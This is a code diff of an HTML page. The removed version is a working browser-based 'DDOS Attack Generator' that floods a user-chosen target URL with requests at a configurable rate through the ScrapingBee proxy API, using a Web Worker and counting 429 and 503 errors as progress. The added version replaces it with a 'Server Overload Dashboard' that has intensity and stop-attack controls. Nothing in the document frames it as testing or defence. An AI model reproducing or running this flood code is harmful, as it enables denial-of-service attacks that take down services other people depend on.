@@ -3,367 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDOS Attack Generator</title>
-    <!-- Tailwind CSS CDN for styling -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #0f172a;
-            color: #e2e8f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 1rem;
-        }
-        .container {
-            background-color: #1e293b;
-            border-radius: 1rem;
-            padding: 2rem;
-            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
-            max-width: 90%;
-            width: 600px;
-            border: 1px solid #334155;
-        }
-        input[type="text"], input[type="number"] {
-            background-color: #334155;
-            border: 1px solid #475569;
-            color: #e2e8f0;
-            border-radius: 0.5rem;
-            padding: 0.75rem 1rem;
-            width: 100%;
-            box-sizing: border-box;
-        }
-        button {
-            background-image: linear-gradient(to right, #4f46e5, #7c3aed);
-            color: white;
-            padding: 0.75rem 1.5rem;
-            border-radius: 0.75rem;
-            font-weight: bold;
-            transition: all 0.2s ease-in-out;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
-            border: none;
-        }
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 10px -1px rgba(0, 0, 0, 0.15), 0 3px 6px -1px rgba(0, 0, 0, 0.08);
-        }
-        button:active {
-            transform: translateY(0);
-            box-shadow: none;
-        }
-        .log-area {
-            background-color: #0f172a;
-            border: 1px solid #334155;
-            border-radius: 0.5rem;
-            padding: 1rem;
-            max-height: 300px;
-            overflow-y: auto;
-            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace;
-            font-size: 0.875rem;
-            color: #94a3b8;
-        }
-        .log-success { color: #22c55e; }
-        .log-fail { color: #ef4444; }
-        .log-info { color: #60a5fa; }
-        .log-warn { color: #facc15; }
-        .log-429 { color: #f97316; }
-        .log-503 { color: #8b5cf6; }
-    </style>
+    <title>DDoS Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 </head>
 <body>
     <div class="container">
-        <h1 class="text-3xl font-bold text-center mb-6 text-indigo-400">DDOS Attack Generator</h1>
-        <div class="mb-4">
-            <label for="targetUrl" class="block text-sm font-medium mb-2">Target URL:</label>
-            <input type="text" id="targetUrl" class="focus:ring-indigo-500 focus:border-indigo-500" placeholder="e.g., https://api.example.com/data">
-        </div>
-        <div class="mb-4">
-            <label for="scrapingBeeApiKey" class="block text-sm font-medium mb-2">ScrapingBee API Key:</label>
-            <input type="text" id="scrapingBeeApiKey" class="focus:ring-indigo-500 focus:border-indigo-500" placeholder="Your ScrapingBee API Key">
-        </div>
-        <div class="mb-6 flex space-x-4">
-            <div class="flex-1">
-                <label for="requestsPerSecond" class="block text-sm font-medium mb-2">Requests per Second (Target):</label>
-                <input type="number" id="requestsPerSecond" class="focus:ring-indigo-500 focus:border-indigo-500" value="1000" min="1">
+        <h1>Server Overload Dashboard</h1>
+        
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h2>Requests Sent</h2>
+                <div id="requests-sent" class="stat-value">0</div>
             </div>
-            <div class="flex-1">
-                <label for="maxRequests" class="block text-sm font-medium mb-2">Max Requests (0 for unlimited):</label>
-                <input type="number" id="maxRequests" class="focus:ring-indigo-500 focus:border-indigo-500" value="0" min="0">
+            <div class="stat-card">
+                <h2>Success Rate</h2>
+                <div id="success-rate" class="stat-value">0%</div>
             </div>
-        </div>
-        <div class="mb-6">
-            <label for="customHeaders" class="block text-sm font-medium mb-2">Custom Headers (JSON format):</label>
-            <textarea id="customHeaders" class="focus:ring-indigo-500 focus:border-indigo-500" rows="4" placeholder='e.g., {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}'></textarea>
-        </div>
-        <div class="flex justify-center space-x-4 mb-6">
-            <button id="startButton" class="w-full sm:w-auto">Start Attack</button>
-            <button id="stopButton" class="w-full sm:w-auto bg-red-600 hover:bg-red-700 focus:ring-red-500" disabled>Stop Attack</button>
-            <button id="clearLogButton" class="w-full sm:w-auto bg-gray-600 hover:bg-gray-700 focus:ring-gray-500">Clear Log</button>
-        </div>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6 text-sm">
-            <div class="p-3 bg-gray-700 rounded-lg">
-                <p class="font-semibold">Total Sent: <span id="totalRequests" class="text-indigo-300">0</span></p>
-                <p class="font-semibold">Successful: <span id="successfulRequests" class="text-green-400">0</span></p>
+            <div class="stat-card">
+                <h2>503 Errors</h2>
+                <div id="error-503" class="stat-value">0</div>
             </div>
-            <div class="p-3 bg-gray-700 rounded-lg">
-                <p class="font-semibold">Failed: <span id="failedRequests" class="text-red-400">0</span></p>
-                <p class="font-semibold">429 Errors: <span id="error429Requests" class="text-orange-400">0</span></p>
-                <p class="font-semibold">503 Errors: <span id="error503Requests" class="text-purple-400">0</span></p>
+            <div class="stat-card">
+                <h2>Requests/Sec</h2>
+                <div id="rps" class="stat-value">0</div>
             </div>
-            <div class="p-3 bg-gray-700 rounded-lg col-span-full">
-                <p class="font-semibold">Current QPS: <span id="currentQPS" class="text-yellow-400">0.00</span></p>
+            <div class="stat-card">
+                <h2>Active Workers</h2>
+                <div id="active-workers" class="stat-value">0</div>
+            </div>
+            <div class="stat-card">
+                <h2>Last Request</h2>
+                <div id="last-request" class="stat-value">0s ago</div>
             </div>
         </div>
-        <div class="log-area" id="logArea">
-            <p class="log-info">Ready to send requests. Enter your target URL and click 'Start Attack'.</p>
+        
+        <div class="chart-container">
+            <canvas id="rps-chart"></canvas>
+        </div>
+        
+        <div class="controls">
+            <button id="intensity-up">Increase Intensity</button>
+            <button id="intensity-down">Decrease Intensity</button>
+            <button id="toggle-attack">Stop Attack</button>
         </div>
     </div>
-    <script>
-        const targetUrlInput = document.getElementById('targetUrl');
-        const scrapingBeeApiKeyInput = document.getElementById('scrapingBeeApiKey');
-        const requestsPerSecondInput = document.getElementById('requestsPerSecond');
-        const maxRequestsInput = document.getElementById('maxRequests');
-        const customHeadersInput = document.getElementById('customHeaders');
-        const startButton = document.getElementById('startButton');
-        const stopButton = document.getElementById('stopButton');
-        const clearLogButton = document.getElementById('clearLogButton');
-        const logArea = document.getElementById('logArea');
-        const totalRequestsSpan = document.getElementById('totalRequests');
-        const successfulRequestsSpan = document.getElementById('successfulRequests');
-        const failedRequestsSpan = document.getElementById('failedRequests');
-        const error429RequestsSpan = document.getElementById('error429Requests');
-        const error503RequestsSpan = document.getElementById('error503Requests');
-        const currentQPSSpan = document.getElementById('currentQPS');
-
-        let isSending = false;
-        let requestCount = 0;
-        let successfulCount = 0;
-        let failedCount = 0;
-        let error429Count = 0;
-        let error503Count = 0;
-        let startTime = 0;
-        let worker;
-        let customHeaders = {};
-
-        // Function to append messages to the log area
-        function log(message, type = 'info') {
-            const p = document.createElement('p');
-            p.className = `log-${type}`;
-            p.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logArea.prepend(p);
-            if (logArea.children.length > 200) {
-                logArea.removeChild(logArea.lastChild);
-            }
-        }
-
-        // Function to start sending requests
-        function startSending() {
-            if (isSending) return;
-
-            const rps = parseInt(requestsPerSecondInput.value, 10);
-            if (isNaN(rps) || rps <= 0) {
-                log('Error: Requests per second must be a positive number.', 'fail');
-                return;
-            }
-
-            const apiKey = scrapingBeeApiKeyInput.value;
-            if (!apiKey) {
-                log('Error: Please provide a ScrapingBee API Key.', 'fail');
-                return;
-            }
-
-            try {
-                customHeaders = JSON.parse(customHeadersInput.value);
-            } catch (e) {
-                log('Error: Custom headers must be valid JSON.', 'fail');
-                return;
-            }
-
-            isSending = true;
-            startButton.disabled = true;
-            stopButton.disabled = false;
-            clearLogButton.disabled = true;
-
-            requestCount = 0;
-            successfulCount = 0;
-            failedCount = 0;
-            error429Count = 0;
-            error503Count = 0;
-            totalRequestsSpan.textContent = 0;
-            successfulRequestsSpan.textContent = 0;
-            failedRequestsSpan.textContent = 0;
-            error429RequestsSpan.textContent = 0;
-            error503RequestsSpan.textContent = 0;
-            currentQPSSpan.textContent = '0.00';
-            logArea.innerHTML = '';
-            log('Starting DDOS attack...', 'info');
-
-            startTime = performance.now();
-
-            const delay = 1000 / rps;
-            const workerCode = `
-                self.onmessage = (event) => {
-                    const { delay, maxRequests, targetUrl, apiKey, customHeaders } = event.data;
-                    let requestCount = 0;
-                    let successfulCount = 0;
-                    let failedCount = 0;
-                    let error429Count = 0;
-                    let error503Count = 0;
-                    const startTime = performance.now();
-
-                    function sendRequest() {
-                        if (maxRequests > 0 && requestCount >= maxRequests) {
-                            self.postMessage({
-                                requestCount,
-                                successfulCount,
-                                failedCount,
-                                error429Count,
-                                error503Count
-                            });
-                            return;
-                        }
-
-                        if (!targetUrl) {
-                            self.postMessage({
-                                requestCount,
-                                successfulCount,
-                                failedCount,
-                                error429Count,
-                                error503Count
-                            });
-                            return;
-                        }
-
-                        requestCount++;
-                        const url = \`https://app.scrapingbee.com/api/v1/?api_key=${apiKey}&url=${encodeURIComponent(targetUrl)}&render_js=true\`;
-
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('GET', url, true);
-                        xhr.timeout = 5000; // 5 seconds timeout
-                        xhr.withCredentials = true;
-
-                        Object.keys(customHeaders).forEach(header => {
-                            xhr.setRequestHeader(header, customHeaders[header]);
-                        });
-
-                        xhr.onreadystatechange = function () {
-                            if (xhr.readyState === 4) {
-                                if (xhr.status === 429) {
-                                    error429Count++;
-                                    failedCount++;
-                                    log(\`429 Too Many Requests\`, '429');
-                                } else if (xhr.status === 503) {
-                                    error503Count++;
-                                    failedCount++;
-                                    log(\`503 Service Unavailable\`, '503');
-                                } else if (xhr.status >= 200 && xhr.status < 300) {
-                                    successfulCount++;
-                                    log(\`Success\`, 'success');
-                                } else {
-                                    failedCount++;
-                                    log(\`Failed with status ${xhr.status}\`, 'fail');
-                                }
-                                self.postMessage({
-                                    requestCount,
-                                    successfulCount,
-                                    failedCount,
-                                    error429Count,
-                                    error503Count
-                                });
-                            }
-                        };
-
-                        xhr.onerror = function () {
-                            failedCount++;
-                            log(\`Network error\`, 'fail');
-                            self.postMessage({
-                                requestCount,
-                                successfulCount,
-                                failedCount,
-                                error429Count,
-                                error503Count
-                            });
-                        };
-
-                        xhr.ontimeout = function () {
-                            failedCount++;
-                            log(\`Timeout\`, 'fail');
-                            self.postMessage({
-                                requestCount,
-                                successfulCount,
-                                failedCount,
-                                error429Count,
-                                error503Count
-                            });
-                        };
-
-                        xhr.send();
-                    }
-
-                    // Use setInterval for high-frequency requests
-                    setInterval(sendRequest, delay);
-                };
-            `;
-            const blob = new Blob([workerCode], { type: 'application/javascript' });
-            const workerUrl = URL.createObjectURL(blob);
-            worker = new Worker(workerUrl);
-            worker.postMessage({ delay, maxRequests: parseInt(maxRequestsInput.value, 10), targetUrl: targetUrlInput.value, apiKey, customHeaders });
-
-            worker.onmessage = (event) => {
-                const data = event.data;
-                requestCount = data.requestCount;
-                successfulCount = data.successfulCount;
-                failedCount = data.failedCount;
-                error429Count = data.error429Count;
-                error503Count = data.error503Count;
-                totalRequestsSpan.textContent = requestCount;
-                successfulRequestsSpan.textContent = successfulCount;
-                failedRequestsSpan.textContent = failedCount;
-                error429RequestsSpan.textContent = error429Count;
-                error503RequestsSpan.textContent = error503Count;
-                const elapsedSeconds = (performance.now() - startTime) / 1000;
-                const qps = elapsedSeconds > 0 ? requestCount / elapsedSeconds : 0;
-                currentQPSSpan.textContent = qps.toFixed(2);
-            };
-
-            worker.onerror = (error) => {
-                log(\`Worker error: ${error.message}\`, 'fail');
-                stopSending();
-            };
-        }
-
-        // Function to stop sending requests
-        function stopSending() {
-            if (!isSending) return;
-
-            isSending = false;
-            startButton.disabled = false;
-            stopButton.disabled = true;
-            clearLogButton.disabled = false;
-
-            if (worker) {
-                worker.terminate();
-                worker = null;
-            }
-            log('Stopped DDOS attack.', 'info');
-            updateQPS();
-        }
-
-        // Function to update QPS
-        function updateQPS() {
-            const elapsedSeconds = (performance.now() - startTime) / 1000;
-            const qps = elapsedSeconds > 0 ? requestCount / elapsedSeconds : 0;
-            currentQPSSpan.textContent = qps.toFixed(2);
-        }
-
-        // Event Listeners
-        startButton.addEventListener('click', startSending);
-        stopButton.addEventListener('click', stopSending);
-        clearLogButton.addEventListener('click', () => {
-            logArea.innerHTML = '<p class="log-info">Log cleared.</p>';
-        });
-    </script>
+    
+    <script src="script.js"></script>
 </body>
 </html>
